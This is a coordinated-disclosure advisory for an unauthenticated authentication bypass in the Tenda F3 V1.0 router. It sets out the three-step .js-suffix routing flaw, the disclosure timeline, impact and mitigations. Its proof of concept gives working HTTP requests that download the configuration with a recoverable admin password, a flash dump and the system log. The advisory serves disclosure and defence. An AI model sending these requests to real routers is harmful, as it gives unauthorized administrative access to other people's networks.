# Tenda F3 V1.0 — Unauthenticated Configuration, Flash, and Syslog Disclosure via Authentication Bypass

**Status:** Published — coordinated disclosure; formal CVE assignment pending
**Author:** Dante Annetta
**CVE ID:** CAN-2026-2037804 *(provisional — pending formal CVE assignment by MITRE)*

## Summary

A three-step logic chain in the GoAhead-based web management interface of the Tenda
F3 V1.0 allows a complete, unauthenticated bypass of the router's session check. This
results in unauthenticated disclosure of:

- The full device configuration backup, including the admin panel password
- A full 1 MiB flash dump
- The complete system log

No credentials, no victim interaction, and no dependency on another user are required.
The issue was confirmed against a physical device. Network scope on the tested unit is
limited to LAN/Wi-Fi (Remote Web Management was disabled), not the open Internet.

This is a scope extension of [CVE-2020-35391](https://nvd.nist.gov/vuln/detail/CVE-2020-35391),
which documented unauthenticated access to the same `DownloadCfg` endpoint on this
device back in 2020, without describing the underlying routing mechanism and without
identifying that the same bug reaches two additional endpoints (`DownloadFlash`,
`DownloadSyslog`) via a shared dispatcher.

## Disclosure Timeline

| Date | Event |
|---|---|
| 2026-09-14 | Static analysis of firmware V11.13.01.06 begins |
| 2026-09-15 ~20:45 | Live confirmation against a physical device (firmware V12.01.01.41_multi), including the DownloadFlash/DownloadSyslog scope extension |
| 2026-09-16 16:14 | Reported to Tenda (`productsecure@tenda.cn`, PGP-encrypted) |
| 2026-09-16 16:32 | Automated (non-substantive) auto-reply received from Tenda's general support queue; no further response from Tenda at any point thereafter |
| 2026-09-16 | CVE ID request submitted to MITRE CNA-LR (CAN-2026-2037804) |
| 2026-09-19 | Report submitted to CERT/CC via VINCE (VRF#26-09-FZTCC) |
| 2026-10-01 | CERT/CC case formally opened as VU#884179, after CERT/CC requested additional time between submission and case opening |
| 2026-10-27 | CERT/CC confirms Tenda was contacted three times without any response; expected CVE issuance on or after 2026-11-16 |
| 2026-11-16 | CERT/CC confirms the embargo lifted (no earlier than 12:00 UTC) and clarifies that CAN-2026-2037804 — not a separately, briefly-assigned CVE-2026-125306, issued in error on the case page and never released publicly — is the sole identifier to reference pending formal CVE assignment |
| 2026-11-16 | Coordinated public disclosure |
## Affected Products

| Product | Firmware tested | Confirmation |
|---|---|---|
| Tenda F3 V1.0 | V11.13.01.06 | Static analysis |
| Tenda F3 V1.0 | V12.01.01.41_multi | Live, on physical hardware |

Intermediate firmware versions were not exhaustively tested; the affected range should
be treated as "at least these two points," not "all versions," pending further static
verification.

## Technical Details

### Step 1 — Extension-based authentication exemption

The authentication gate exempts any request path ending in `.js` from the session
check — intended for static JS assets, implemented as a suffix match on the path
string rather than validating that the resource is actually a static asset. Protected
`.html` paths correctly redirect to `/login.html` (302) without a session; any path
ending in `.js` is served without that check.

### Step 2 — Parser truncation in `websFormHandler`

This is stock GoAhead behavior, not a Tenda-introduced bug. Requesting
`/goform/getSysTools.js` returns the literal GoAhead error
`"Form getSysTools.js is not defined"`. Inserting a slash before the extension
(`/goform/<action>/x.js`) causes the handler's parser to truncate the action name at
that slash and dispatch the real action — ignoring everything after it — while the
Step 1 gate still only sees the trailing `.js` and lets the request through without a
session.

### Step 3 — Missing secondary check under `/cgi-bin/`

`/goform/get*` actions (stock GoAhead) include an additional in-function check:
without a valid cookie they return an empty JSON object (`{}`) even if the Step 1/2
routing bypass succeeded. `/cgi-bin/` actions, however, are dispatched by Tenda's own
`tenda_cgi.c`, which has no equivalent check.

### Combined effect

`/cgi-bin/DownloadCfg/RouterCfm.cfg.js` chains all three steps and returns the full
configuration backup to any unauthenticated requester. The same routing bypass (Step 1)
reaches two additional `/cgi-bin/` actions registered in the same binary:
`DownloadFlash` and `DownloadSyslog`. Without the `.js` suffix, both correctly redirect
to `/login.html` (302) — the gate works as intended in that case. **The bug is not
specific to the `DownloadCfg` handler; it lives in the shared `/cgi-bin/` dispatcher.**
A fix scoped only to `DownloadCfg` would not close the other two.

### Why the password is recoverable from the backup

The panel session cookie (`ecos_pw`) is `base64(password)` — reversible encoding, no
hash, no HMAC, no nonce/timestamp (confirmed via the device's own `common.js`,
`Encode()` function). The same value appears in the config backup. A blank/invalid
cookie does not pass the Step 3 check on its own — the bypass depends entirely on the
missing check under `/cgi-bin/`, not on any weakness in the cookie scheme itself.

## Proof of Concept

All three requests require no cookie and no prior authentication:

```
GET /cgi-bin/DownloadCfg/RouterCfm.cfg.js HTTP/1.1
Host: <router IP>

→ HTTP/1.1 200 OK
→ 14,903 bytes — full configuration backup (includes base64-encoded admin password)
```

```
GET /cgi-bin/DownloadFlash/RouterFlash.bin.js HTTP/1.1
Host: <router IP>

→ HTTP/1.0 200 OK
→ Content-Length: 1048576 — full 1 MiB flash dump
```

```
GET /cgi-bin/DownloadSyslog/RouterSystem.log.js HTTP/1.1
Host: <router IP>

→ HTTP/1.0 200 OK
→ full system log, live device activity
```

Control case: the same three actions, requested without the `.js` bypass, correctly
redirect to `/login.html` with HTTP 302 — confirming the authentication gate otherwise
functions as intended.

## Impact

| | |
|---|---|
| Credentials required | None |
| Dependency on another user/victim | None |
| Data exposed | Admin panel password (base64-encoded, trivially reversible), full device configuration, full flash contents, system log |
| Confirmed end result | Full administrative access to the management panel |
| Network scope | LAN/Wi-Fi only on the tested unit — Remote Web Management (WAN) confirmed disabled |

## CVSS

`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — **8.8 (High)**

`AV:A` reflects that Remote Web Management was disabled on the tested unit; this score
would rise if remote management were enabled elsewhere.

## CWE

**CWE-288** — Authentication Bypass Using an Alternate Path or Channel.

## Mitigations

1. Change the panel admin password — any previous password is recoverable by anyone
   with LAN/Wi-Fi access via this chain.
2. Keep Remote Web Management (WAN) disabled. Enabling it makes this chain exploitable
   from the Internet.
3. Restrict panel access to trusted IPs if the router firmware supports it.
4. No vendor patch is confirmed available at the time of writing — see timeline above.

## Prior Art / Related CVEs

- [CVE-2020-35391](https://nvd.nist.gov/vuln/detail/CVE-2020-35391) — Tenda F3, same
  `DownloadCfg` endpoint, reported without documented response, no known patch. Does
  not describe this mechanism or the DownloadFlash/DownloadSyslog scope.
- CVE-2022-40845 / CVE-2026-30140 — Tenda AC1200 V-W15Ev2 / Tenda W15E, same
  unauthenticated-config-download pattern on sibling models.
- CVE-2023-29680 / CVE-2023-29681 — Tenda N301 v6.0, plaintext-equivalent transmission
  of the password via the same `ecos_pw` cookie mechanism.
- TALOS-2025-2165 — Tenda AC6 v5.0, different auth bypass mechanism (Host header
  manipulation), confirms `ecos_pw` is reused broadly across the Tenda line.

## Disclosure Statement

This vulnerability was reported to Tenda via their official security channel
(productsecure@tenda.cn) and coordinated through CERT/CC under case VU#884179
(VINCE). Tenda did not respond beyond an automated, non-substantive acknowledgment,
despite three separate contact attempts documented by CERT/CC. The embargo was
confirmed lifted by CERT/CC no earlier than 12:00 UTC on 2026-11-16.

## Credits

Discovered and reported by **Dante Annetta**.
